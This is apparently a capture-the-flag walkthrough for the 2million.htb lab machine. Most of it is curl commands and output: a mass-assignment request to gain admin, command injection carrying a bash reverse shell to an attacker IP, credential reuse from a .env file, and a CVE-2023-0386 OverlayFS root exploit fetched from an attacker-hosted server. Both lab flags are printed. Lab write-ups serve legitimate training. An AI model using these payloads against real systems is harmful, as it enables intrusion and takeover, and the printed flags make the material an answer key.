# 2million.htb — quick demo

Box `10.129.229.66`, header `Host: 2million.htb`, attacker = tun0 `10.10.14.24`.
Full trail in `2026-11-*.md`; this is the fast path only.

**Chain:** `invite code` → account → **mass-assign is_admin** → **cmd injection** = www-data shell → `.env` creds = admin (**user flag**) → **CVE-2023-0386** = root (**root flag**)

## 1. Invite + account (2 min)

```bash
B=http://10.129.229.66; H='Host: 2million.htb'
CODE=$(curl -s -X POST -H "$H" $B/api/v1/invite/generate | grep -oE '[A-Za-z0-9=]{20,}' | base64 -d)   # e.g. K8FLU-BDIVW-OZB1I-49I86
curl -s -X POST -H "$H" $B/api/v1/user/register -d "code=$CODE&username=demo&email=demo@2million.htb&password=Pw2million!HTB&password_confirmation=Pw2million!HTB"
curl -s -c cookies.txt -X POST -H "$H" $B/api/v1/user/login -d 'email=demo@2million.htb&password=Pw2million!HTB'
```

API form-encoded only; invite code is single-use, verify burns it. Registered accounts get nothing interesting → all value is in the API itself.

## 2. Admin in ONE request (mass-assignment, no check)

`PUT /api/v1/admin/settings/update` has no privilege check and accepts `is_admin`:

```bash
curl -s -X PUT -b cookies.txt -H "$H" -H 'Content-Type: application/json' \
  -d '{"email":"demo@2million.htb","is_admin":1}' $B/api/v1/admin/settings/update
# {"id":..,"username":"demo","is_admin":1}
```

## 3. RCE (command injection, output via cert CN)

`POST /api/v1/admin/vpn/generate` puts username into a shell command. Quick file reads without a shell — output lands in the cert subject (avoid `/` and spaces in payload):

```bash
x() { curl -s -X POST -b cookies.txt -H "$H" -H 'Content-Type: application/json' \
  --data-binary "{\"username\":\"\$($1)\"}" $B/api/v1/admin/vpn/generate | grep Subject; }
x 'ls home'        # home contains: admin
```

Full shell (bash -i one-liner, backgrounded):

```bash
nc -lvnp 9003   # attacker
curl -X POST -b cookies.txt -H "$H" -H 'Content-Type: application/json' \
  -d '{"username":"demo;bash -c \"bash -i >& /dev/tcp/10.10.14.24/9003 0>&1\" &"}' $B/api/v1/admin/vpn/generate
```

## 4. user.txt (creds reuse, 2 min)

```bash
cat /var/www/html/.env    # DB_PASSWORD=SuperDuperPass123
echo SuperDuperPass123 | su - admin -c "cat /home/admin/user.txt"   # works non-tty
# aecfed32bbb3055fdbf97ef0d6bf39ba
```

## 5. root.txt (CVE-2023-0386 OverlayFS, 5 min)

`/var/mail/admin` literally names it: *"OverlayFS / FUSE looks nasty"*; kernel 5.15.70 < 5.15.90 fix.
How it works: `fuse` serves a fake **SUID-root** file (`gc` = setuid(0)+bash) from a **nosuid** FUSE mount → `exp` mounts an overlay in a user-ns and writes to it → copy-up pulls the SUID file into a normal fs **keeping SUID** (the CVE) → `exp` executes the copy → root bash.
Box gcc is broken (cc1 present but not executable) → build off-box, transfer:

```bash
# attacker: one-off build in container, then serve
docker run --rm -v "$PWD/tmp/CVE-2023-0386-main:/src" ubuntu:22.04 bash -c \
  "apt-get update -qq && apt-get install -y -qq gcc make libfuse-dev libcap-dev && cd /src && make"
python3 -m http.server 8000 --bind 10.10.14.24   # from tmp/
```

```bash
# box (www-data is enough, no admin needed for privesc)
cd /tmp/cve && curl -sO http://10.10.14.24:8000/CVE-2023-0386-main/{fuse,exp,gc} && chmod +x fuse exp gc
./fuse ./ovlcap/lower ./gc &          # NOT ./ovlcap/lowerdir — exp.c expects "lower"
sleep 3 && ./exp                      # SUID copy-up → root bash
id; cat /root/root.txt                # uid=0(root)
# 3dd24e3bae4fa0c0244e61feae6516be
```

## Fast-and-easy summary

| Step | Weakness | Effort |
|---|---|---|
| invite/register | client-side packer hides 2 endpoints | 2 min |
| admin | unauthenticated mass-assign `is_admin` | 1 request |
| shell | username → shell command (www-data) | 1 request + nc |
| user flag | `.env` password == admin unix password | 2 files read |
| root | CVE-2023-0386, pre-patched-hint in /var/mail | 1 binary + 2 commands |

Flags: user `aecfed32bbb3055fdbf97ef0d6bf39ba` · root `3dd24e3bae4fa0c0244e61feae6516be`
